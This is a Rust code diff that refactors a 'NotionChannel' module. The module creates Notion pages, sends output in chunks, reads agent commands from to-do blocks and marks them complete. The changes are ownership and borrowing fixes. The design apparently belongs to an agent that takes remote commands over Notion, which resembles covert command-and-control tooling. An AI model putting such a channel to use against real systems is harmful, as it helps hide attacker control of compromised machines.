@@ -18,14 +18,14 @@ const CHUNK_SIZE: usize = 2000;
 /// Base Notion API URL
 const URL_BASE: &str = "https://api.notion.com/v1";
 
-#[derive(Debug, Serialize, Deserialize)]
+#[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct NotionConfig {
     pub api_key: String,
     pub parent_page_id: String,
     pub page_id: String,
 }
 
-#[derive(Debug, Serialize, Deserialize)]
+#[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct NotionChannel {
     pub config: NotionConfig,
     #[serde(skip_serializing)]
@@ -92,8 +92,8 @@ impl NotionChannel {
 
     /// Retrieves blocks from Notion. All children blocks of the parent page returned
     /// TODO: Account for pagination for > 100 children.
-    pub async fn get_blocks(self) -> Result<serde_json::Value, String> {
-        let page_id = self.config.page_id;
+    pub async fn get_blocks(&self) -> Result<serde_json::Value, String> {
+        let page_id = &self.config.page_id;
         let url = format!("{URL_BASE}/blocks/{page_id}/children");
 
         let r = self.client.get(url).send().await.unwrap();
@@ -121,7 +121,7 @@ impl Channel for NotionChannel {
     /// Utility function for creating Notion Pages
     /// Used during the build of a new [NotionChannel] in `NotionChannel::init
     /// 
-    async fn init(self) -> Result<String, ChannelError> {
+    async fn init(&mut self) -> Result<String, ChannelError> {
         self.logger.info(format!("Creating page..."));
 
         // Initialize the client to send
@@ -193,12 +193,13 @@ impl Channel for NotionChannel {
 
 
         let result_text = r.text().await.unwrap();
-        self.logger.debug(result_text);
+        // Annoying to_string() here because that's a move before the return
+        self.logger.debug(result_text.to_string());
         Ok(result_text)    
 
     }
 
-    async fn send(self, data: String, command_block_id: &str) -> Result<String, ChannelError> {
+    async fn send(&self, data: String, command_block_id: &str) -> Result<String, ChannelError> {
 
         self.logger.debug(format!("{data}"));
         let chunks:Vec<serde_json::Value> = data
@@ -230,17 +231,18 @@ impl Channel for NotionChannel {
             .await
             .unwrap();
         
-        let result_text = r.text().await.unwrap();
+        
         if !r.status().is_success() {
-            self.logger.debug(result_text);
+            let result_text = r.text().await.unwrap();
+            self.logger.debug(result_text.to_string());
             Ok(result_text)
         } else {
-            Err(ChannelError::new(&result_text))
+            Err(ChannelError::new(&r.text().await.unwrap()))
         }
     }
 
     /// Marks a job done by making the to-do item checked.
-    async fn complete(self, cmd: AgentCommand) -> () {
+    async fn complete(&self, cmd: AgentCommand) -> () {
         
         // Set completed status
         let block_id = cmd.rel;
@@ -263,7 +265,7 @@ impl Channel for NotionChannel {
         }
     }
 
-    async fn receive(self) -> Result<Vec<AgentCommand>, ChannelError> {
+    async fn receive(&self) -> Result<Vec<AgentCommand>, ChannelError> {
         let blocks = self.get_blocks().await.unwrap();
 
         let command_blocks: Vec<&serde_json::Value> = blocks
